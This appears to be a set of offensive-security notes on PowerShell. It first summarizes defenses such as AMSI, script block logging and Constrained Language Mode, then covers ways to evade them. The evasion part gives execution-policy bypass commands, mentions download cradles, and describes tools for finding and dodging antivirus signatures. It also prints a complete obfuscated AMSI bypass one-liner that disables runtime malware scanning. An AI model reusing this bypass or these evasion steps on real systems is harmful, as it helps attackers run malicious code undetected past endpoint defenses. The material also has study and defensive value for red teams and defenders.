## Powershell

### SECURITY AND DETECTION

### Script Block Logging 
- This feature captures and logs the content of executed PowerShell script blocks. It provides visibility into both legitimate and malicious PowerShell activities, even for dynamically generated or obfuscated scripts. Logs are stored in the Windows Event Log under the PowerShell Operational log.

### Anti-Malware Scan Interface (AMSI) 
- AMSI integrates with antivirus software to scan PowerShell scripts and commands at runtime. It detects and blocks malicious activities, even those using obfuscation or encoded payloads. AMSI is widely adopted for enhancing script-level security.

### Constrained Language Mode (CLM)
- CLM restricts the commands and features available in PowerShell to reduce abuse by attackers. It limits access to .NET classes, COM objects, and other advanced scripting functionalities. CLM is enforced automatically for untrusted scripts or when integrated with security tools like AppLocker and WDAC.

## Integration with AppLocker and WDAC (Device Guard)
- CLM works seamlessly with AppLocker and Windows Defender Application Control (WDAC). These tools enforce policies that determine which scripts and executables can run, adding an extra layer of security. Together, they prevent unauthorized or malicious PowerShell execution

### Bypass Security Features

* Obfuscation: Using tools like Invoke-Obfuscation to encode or disguise scripts.
* In-Memory Execution: Running scripts without saving to disk, reducing artifact traces.
* Download Cradles: Fetching payloads directly from a remote server.

Execution Policy Bypass
```
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"
```

### Invisi-Shell
- Invisi-Shell is a tool designed to bypass PowerShell security by hooking into .NET assemblies, including System.Management.Automation.dll and System.Core.dll, to evade logging mechanisms. It uses the CLR Profiler API, a DLL that communicates with the Common Language Runtime (CLR) to modify runtime behavior.

## Tools and Script for AV Signatures Bypass

### AMSITrigger
- AMSITrigger helps identify which parts of a PowerShell script are flagged by AMSI (Anti-Malware Scan Interface), allowing precise modifications to bypass detection.
How It Works:
* Scans the script for AMSI detections.
* Pinpoints the exact code segment causing detection.
* Allows modifications (e.g., obfuscation, string reversal) to bypass detection.
 
* AmsiTrigger_x64.exe -i C:\Path\To\Script.ps1

**AMSI BYPASS**
```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```


### DefenderCheck
DefenderCheck identifies strings and code that might trigger Windows Defender’s detection mechanisms, helping assess what parts of a file are flagged.
How It Works:
* Scans files and scripts for known signatures flagged by Windows Defender.
* Provides feedback on strings or code patterns that trigger detections.
Usage:
DefenderCheck.exe Script.ps1


### ProtectMyTooling
ProtectMyTooling obfuscates PowerShell payloads (like PowerKatz DLL) to prevent signature detection by antivirus engines.
How It Works:
* Obfuscates DLLs (e.g., PowerKatz) by encrypting and encoding them.
* Converts the obfuscated payload into Base64 and reverses the string to bypass static detections


### Invoke-Obfuscation
Invoke-Obfuscation is a tool for fully obfuscating PowerShell scripts, including AMSI bypasses, by randomizing and modifying strings, functions, and the overall script structure.
How It Works:
* Randomizes function names, strings, and syntax to avoid static signature detection.
* Useful for obfuscating AMSI bypass code and PowerShell payloads.
Usage:
Invoke-Obfuscation.ps1
